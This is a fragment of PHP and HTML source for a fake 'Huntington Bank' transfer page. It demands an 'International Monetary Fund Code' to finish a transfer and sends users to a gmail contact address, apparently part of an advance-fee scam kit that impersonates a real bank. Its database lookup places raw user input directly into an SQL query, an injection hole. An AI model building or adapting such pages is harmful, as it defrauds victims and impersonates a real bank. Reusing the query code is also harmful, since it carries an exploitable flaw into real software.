...
//admin sign up
	...
	box-shadow: 5px 5px 5px rgba(68,68,68,0.6);color:#000;padding:7px;border-radius:5px;margin-top:10px;margin-right:5px;margin-left:5px;">OK</div>
            ...
            $q=$conn->query("SELECT * FROM codes WHERE account='$account' AND imf='$imf'") or die(mysqli_error($conn));
            if(mysqli_num_rows($q)>0){
                $_SESSION['code']=$account;
                header("location: vat_authentication?account=".$_POST['account']."&imf=".$_POST['imf']."");
                exit;
            }
            else {
                $err='<div id="myModal" class="modal fade">
    <div class="modal-dialog">
        <div class="modal-content">
            ...
            <div align="center" class="modal-body">
              <font color="red"><b>IMF Authorization Failed.</b></font><br>
              <div align="center" data-dismiss="modal" aria-hidden="true" style="font-weight:bold;background:#fff;border:1px solid #ccc;-moz-box-shadow: 5px 5px 5px rgba(68,68,68,0.6);
	-webkit-box-shadow: 5px 5px 5px rgba(68,68,68,0.6);
	box-shadow: 5px 5px 5px rgba(68,68,68,0.6);color:#000;padding:7px;border-radius:5px;margin-top:10px;margin-right:5px;margin-left:5px;">OK</div>
            </div>
...
<html lang="en-US" prefix="og: http://ogp.me/ns#">
	...
	<title>Verify IMF: Transfer Almost Completed | Huntington Bank</title>
    <style>
...
<h5 style="margin-left:11px;font-weight:bold;font-size:15px;">Transfer In Progress</h5>
		...
		<input class="form-control input-lg no-border" type="number" name="imf" placeholder="Enter IMF Code here..."><br>
	<!-- <input type="submit" name="submit"> --><p style="font-size:14px;" class="failure">Enter <i><strong>International Monetary Fund Code</strong></i> to continue transfer. If you do not have the code, kindly contact your bank (ibank.huntington@gmail.com) to proceed.
	 <div>
